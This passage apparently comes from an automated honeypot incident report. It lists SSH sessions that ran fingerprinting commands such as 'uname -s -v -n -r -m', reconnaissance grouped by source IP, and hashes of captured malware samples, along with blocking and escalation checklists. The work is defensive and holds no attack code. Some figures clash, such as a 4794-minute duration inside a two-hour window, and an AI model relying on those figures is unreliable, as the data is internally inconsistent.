| `2026-08-16 18:53:39` | `cowrie.session.params` |
| `2026-08-16 18:53:39` | `cowrie.command.input` |
| `2026-08-16 18:53:40` | `cowrie.log.closed` |
| `2026-08-16 18:53:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d91b94c5d7d9

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:53 |
| **Last Seen** | 2026-08-16 18:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:53:43` | `cowrie.session.connect` |
| `2026-08-16 18:53:43` | `cowrie.client.version` |
| `2026-08-16 18:53:44` | `cowrie.client.kex` |
| `2026-08-16 18:53:44` | `cowrie.login.success` |
| `2026-08-16 18:53:44` | `cowrie.session.params` |
| `2026-08-16 18:53:44` | `cowrie.command.input` |
| `2026-08-16 18:53:45` | `cowrie.log.closed` |
| `2026-08-16 18:53:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af11fa9d79a9

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:53 |
| **Last Seen** | 2026-08-16 18:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:53:49` | `cowrie.session.connect` |
| `2026-08-16 18:53:49` | `cowrie.client.version` |
| `2026-08-16 18:53:49` | `cowrie.client.kex` |
| `2026-08-16 18:53:49` | `cowrie.login.success` |
| `2026-08-16 18:53:50` | `cowrie.session.params` |
| `2026-08-16 18:53:50` | `cowrie.command.input` |
| `2026-08-16 18:53:50` | `cowrie.log.closed` |
| `2026-08-16 18:53:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-961d25a574b3

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:53 |
| **Last Seen** | 2026-08-16 18:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:53:54` | `cowrie.session.connect` |
| `2026-08-16 18:53:54` | `cowrie.client.version` |
| `2026-08-16 18:53:54` | `cowrie.client.kex` |
| `2026-08-16 18:53:55` | `cowrie.login.success` |
| `2026-08-16 18:53:55` | `cowrie.session.params` |
| `2026-08-16 18:53:55` | `cowrie.command.input` |
| `2026-08-16 18:53:55` | `cowrie.log.closed` |
| `2026-08-16 18:53:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43f6e11eb751

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:53 |
| **Last Seen** | 2026-08-16 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:53:59` | `cowrie.session.connect` |
| `2026-08-16 18:53:59` | `cowrie.client.version` |
| `2026-08-16 18:54:00` | `cowrie.client.kex` |
| `2026-08-16 18:54:00` | `cowrie.login.success` |
| `2026-08-16 18:54:01` | `cowrie.session.params` |
| `2026-08-16 18:54:01` | `cowrie.command.input` |
| `2026-08-16 18:54:01` | `cowrie.log.closed` |
| `2026-08-16 18:54:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f30ca95402a

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:54 |
| **Last Seen** | 2026-08-16 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:54:05` | `cowrie.session.connect` |
| `2026-08-16 18:54:05` | `cowrie.client.version` |
| `2026-08-16 18:54:05` | `cowrie.client.kex` |
| `2026-08-16 18:54:05` | `cowrie.login.success` |
| `2026-08-16 18:54:06` | `cowrie.session.params` |
| `2026-08-16 18:54:06` | `cowrie.command.input` |
| `2026-08-16 18:54:06` | `cowrie.log.closed` |
| `2026-08-16 18:54:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71b65f2515a4

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:54 |
| **Last Seen** | 2026-08-16 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:54:10` | `cowrie.session.connect` |
| `2026-08-16 18:54:10` | `cowrie.client.version` |
| `2026-08-16 18:54:10` | `cowrie.client.kex` |
| `2026-08-16 18:54:10` | `cowrie.login.success` |
| `2026-08-16 18:54:11` | `cowrie.session.params` |
| `2026-08-16 18:54:11` | `cowrie.command.input` |
| `2026-08-16 18:54:11` | `cowrie.log.closed` |
| `2026-08-16 18:54:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75d5951d2710

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:54 |
| **Last Seen** | 2026-08-16 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:54:15` | `cowrie.session.connect` |
| `2026-08-16 18:54:15` | `cowrie.client.version` |
| `2026-08-16 18:54:15` | `cowrie.client.kex` |
| `2026-08-16 18:54:16` | `cowrie.login.success` |
| `2026-08-16 18:54:16` | `cowrie.session.params` |
| `2026-08-16 18:54:16` | `cowrie.command.input` |
| `2026-08-16 18:54:17` | `cowrie.log.closed` |
| `2026-08-16 18:54:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-432842f08ac2

| Field | Detail |
|---|---|
| **Source IP** | `185.74.59[.]14` |
| **First Seen** | 2026-08-16 18:54 |
| **Last Seen** | 2026-08-16 18:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:54:16` | `cowrie.session.connect` |
| `2026-08-16 18:54:16` | `cowrie.client.version` |
| `2026-08-16 18:54:19` | `cowrie.client.kex` |
| `2026-08-16 18:54:20` | `cowrie.login.success` |
| `2026-08-16 18:54:20` | `cowrie.session.params` |
| `2026-08-16 18:54:20` | `cowrie.command.input` |
| `2026-08-16 18:54:21` | `cowrie.log.closed` |
| `2026-08-16 18:54:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.74.59[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.74.59[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee2d7df7494b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]26` |
| **First Seen** | 2026-08-16 18:54 |
| **Last Seen** | 2026-08-16 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:54:18` | `cowrie.session.connect` |
| `2026-08-16 18:54:18` | `cowrie.client.version` |
| `2026-08-16 18:54:18` | `cowrie.client.kex` |
| `2026-08-16 18:54:18` | `cowrie.login.success` |
| `2026-08-16 18:54:19` | `cowrie.session.params` |
| `2026-08-16 18:54:19` | `cowrie.command.input` |
| `2026-08-16 18:54:19` | `cowrie.log.closed` |
| `2026-08-16 18:54:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]26` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82e7a15ac02f

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:54 |
| **Last Seen** | 2026-08-16 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:54:20` | `cowrie.session.connect` |
| `2026-08-16 18:54:20` | `cowrie.client.version` |
| `2026-08-16 18:54:21` | `cowrie.client.kex` |
| `2026-08-16 18:54:21` | `cowrie.login.success` |
| `2026-08-16 18:54:22` | `cowrie.session.params` |
| `2026-08-16 18:54:22` | `cowrie.command.input` |
| `2026-08-16 18:54:22` | `cowrie.log.closed` |
| `2026-08-16 18:54:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8f18f50fa78

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:54 |
| **Last Seen** | 2026-08-16 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:54:25` | `cowrie.session.connect` |
| `2026-08-16 18:54:25` | `cowrie.client.version` |
| `2026-08-16 18:54:25` | `cowrie.client.kex` |
| `2026-08-16 18:54:26` | `cowrie.login.success` |
| `2026-08-16 18:54:26` | `cowrie.session.params` |
| `2026-08-16 18:54:26` | `cowrie.command.input` |
| `2026-08-16 18:54:27` | `cowrie.log.closed` |
| `2026-08-16 18:54:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfbb6487a82e

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:54 |
| **Last Seen** | 2026-08-16 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:54:30` | `cowrie.session.connect` |
| `2026-08-16 18:54:30` | `cowrie.client.version` |
| `2026-08-16 18:54:30` | `cowrie.client.kex` |
| `2026-08-16 18:54:31` | `cowrie.login.success` |
| `2026-08-16 18:54:31` | `cowrie.session.params` |
| `2026-08-16 18:54:31` | `cowrie.command.input` |
| `2026-08-16 18:54:32` | `cowrie.log.closed` |
| `2026-08-16 18:54:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0508f026b77a

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:54 |
| **Last Seen** | 2026-08-16 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:54:36` | `cowrie.session.connect` |
| `2026-08-16 18:54:36` | `cowrie.client.version` |
| `2026-08-16 18:54:36` | `cowrie.client.kex` |
| `2026-08-16 18:54:36` | `cowrie.login.success` |
| `2026-08-16 18:54:37` | `cowrie.session.params` |
| `2026-08-16 18:54:37` | `cowrie.command.input` |
| `2026-08-16 18:54:37` | `cowrie.log.closed` |
| `2026-08-16 18:54:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b656ce23bd8

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:54 |
| **Last Seen** | 2026-08-16 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:54:41` | `cowrie.session.connect` |
| `2026-08-16 18:54:41` | `cowrie.client.version` |
| `2026-08-16 18:54:41` | `cowrie.client.kex` |
| `2026-08-16 18:54:41` | `cowrie.login.success` |
| `2026-08-16 18:54:42` | `cowrie.session.params` |
| `2026-08-16 18:54:42` | `cowrie.command.input` |
| `2026-08-16 18:54:42` | `cowrie.log.closed` |
| `2026-08-16 18:54:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd8742a9943b

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:54 |
| **Last Seen** | 2026-08-16 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:54:46` | `cowrie.session.connect` |
| `2026-08-16 18:54:46` | `cowrie.client.version` |
| `2026-08-16 18:54:46` | `cowrie.client.kex` |
| `2026-08-16 18:54:46` | `cowrie.login.success` |
| `2026-08-16 18:54:47` | `cowrie.session.params` |
| `2026-08-16 18:54:47` | `cowrie.command.input` |
| `2026-08-16 18:54:48` | `cowrie.log.closed` |
| `2026-08-16 18:54:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1dca0570a40

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:54 |
| **Last Seen** | 2026-08-16 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:54:51` | `cowrie.session.connect` |
| `2026-08-16 18:54:51` | `cowrie.client.version` |
| `2026-08-16 18:54:51` | `cowrie.client.kex` |
| `2026-08-16 18:54:52` | `cowrie.login.success` |
| `2026-08-16 18:54:53` | `cowrie.session.params` |
| `2026-08-16 18:54:53` | `cowrie.command.input` |
| `2026-08-16 18:54:53` | `cowrie.log.closed` |
| `2026-08-16 18:54:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dbea71d3e07

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:54 |
| **Last Seen** | 2026-08-16 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:54:56` | `cowrie.session.connect` |
| `2026-08-16 18:54:56` | `cowrie.client.version` |
| `2026-08-16 18:54:56` | `cowrie.client.kex` |
| `2026-08-16 18:54:57` | `cowrie.login.success` |
| `2026-08-16 18:54:58` | `cowrie.session.params` |
| `2026-08-16 18:54:58` | `cowrie.command.input` |
| `2026-08-16 18:54:58` | `cowrie.log.closed` |
| `2026-08-16 18:54:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e0bfc4aa659

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:55 |
| **Last Seen** | 2026-08-16 18:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:55:02` | `cowrie.session.connect` |
| `2026-08-16 18:55:02` | `cowrie.client.version` |
| `2026-08-16 18:55:02` | `cowrie.client.kex` |
| `2026-08-16 18:55:02` | `cowrie.login.success` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `80.251.153[.]178` | **3987** | 2026-08-16 16:55 | 2026-08-16 18:54 | 4794m | 0 | `T1592` | 🟠 MEDIUM |
| `107.150.146[.]69` | **36** | 2026-08-16 16:55 | 2026-08-16 18:53 | 20m | 0 | `T1592` | 🟠 MEDIUM |
| `210.16.100[.]120` | **11** | 2026-08-16 16:59 | 2026-08-16 18:54 | 11m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **5** | 2026-08-16 17:05 | 2026-08-16 18:50 | 0m | 0 | `T1592` | 🟢 LOW |
| `116.99.170[.]187` | **2** | 2026-08-16 17:11 | 2026-08-16 17:26 | 2m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `172.104.11[.]46` | **2** | 2026-08-16 18:47 | 2026-08-16 18:47 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.202.113[.]3` | **2** | 2026-08-16 17:12 | 2026-08-16 17:12 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.142.193[.]164` | **2** | 2026-08-16 17:33 | 2026-08-16 17:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.200.236[.]207` | 1 | 2026-08-16 17:50 | 2026-08-16 17:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.26.202[.]34` | 1 | 2026-08-16 16:56 | 2026-08-16 16:56 | 3s | 0 | `T1592` | 🟢 LOW |
| `121.202.146[.]144` | 1 | 2026-08-16 18:37 | 2026-08-16 18:37 | 4s | 0 | `T1592` | 🟢 LOW |
| `121.40.84[.]227` | 1 | 2026-08-16 18:06 | 2026-08-16 18:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `154.223.128[.]44` | 1 | 2026-08-16 17:53 | 2026-08-16 17:53 | 13s | 0 | `T1592` | 🟢 LOW |
| `172.239.64[.]86` | 1 | 2026-08-16 18:49 | 2026-08-16 18:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `179.105.30[.]163` | 1 | 2026-08-16 17:33 | 2026-08-16 17:33 | 10s | 0 | `T1592` | 🟢 LOW |
| `181.44.170[.]243` | 1 | 2026-08-16 16:56 | 2026-08-16 16:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]26` | 1 | 2026-08-16 17:55 | 2026-08-16 17:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `31.77.227[.]120` | 1 | 2026-08-16 17:36 | 2026-08-16 17:36 | 2s | 0 | `T1592` | 🟢 LOW |
| `45.205.1[.]241` | 1 | 2026-08-16 17:52 | 2026-08-16 17:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `50.187.155[.]130` | 1 | 2026-08-16 16:56 | 2026-08-16 16:57 | 49s | 0 | `T1592` | 🟢 LOW |
| `50.223.176[.]171` | 1 | 2026-08-16 17:30 | 2026-08-16 17:30 | 22s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]241` | 1 | 2026-08-16 18:38 | 2026-08-16 18:38 | 8s | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | 1 | 2026-08-16 17:49 | 2026-08-16 17:49 | 43s | 0 | `T1592` | 🟢 LOW |
| `91.242.187[.]125` | 1 | 2026-08-16 18:10 | 2026-08-16 18:10 | 12s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]71` | 1 | 2026-08-16 17:04 | 2026-08-16 17:05 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 43/100 | 🟡 MEDIUM | **33/72** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 81/100 | 🔴 HIGH | **28/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **23/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
